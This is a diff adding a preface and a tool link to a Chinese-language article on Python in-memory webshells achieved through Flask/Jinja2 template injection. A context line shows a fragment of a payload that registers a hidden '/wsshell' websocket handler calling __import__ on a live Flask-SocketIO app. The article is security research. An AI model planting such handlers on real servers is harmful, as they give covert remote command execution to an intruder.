@@ -1,4 +1,6 @@
 # 前言
+前段时间在看内存马相关内容时，发现python方面的资料不是很多，感觉可能是python web本来就少没那么热门，能够拿到shell的方法也不多。但是还是在SSTI的漏洞利用基础上探索了一些新姿势。
+在 websocket 那节纯纯尝试，实战中几乎没有用。
 # SSTI相关
 Flask 框架默认使用 Jinja2 作为模板引擎来动态的渲染网页。
 关于 SSTI 已经有了不少优秀的文章，这里只是说一下个人理解和折腾。
@@ -744,3 +746,5 @@ app.extensions['socketio'].server.handlers['/wsshell']['shell']= lambda s,d: __i
 ```
 
 
+用到的demo以及开发的工具：
+[https://github.com/orzchen/PyMemShell/](https://github.com/orzchen/PyMemShell/)
